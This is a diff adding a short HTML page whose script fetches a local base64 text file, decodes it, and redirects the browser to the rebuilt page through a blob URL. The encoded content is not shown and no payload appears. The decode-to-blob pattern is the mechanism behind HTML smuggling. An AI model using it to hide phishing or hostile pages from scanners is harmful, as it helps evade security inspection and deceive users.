@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Decoded Base64 HTML</title>
+</head>
+<body>
+  <h2>Loading page...</h2>
+  <script>
+    // Replace this filename with your actual Base64 file name
+    const base64File = "encoded-20250807.txt";
+
+    fetch(base64File)
+      .then(response => response.text())
+      .then(base64 => {
+        const decodedHtml = atob(base64.replace(/\s/g, ''));
+        const blob = new Blob([decodedHtml], { type: "text/html" });
+        const url = URL.createObjectURL(blob);
+        window.location.href = url;
+      });
+  </script>
+</body>
+</html>
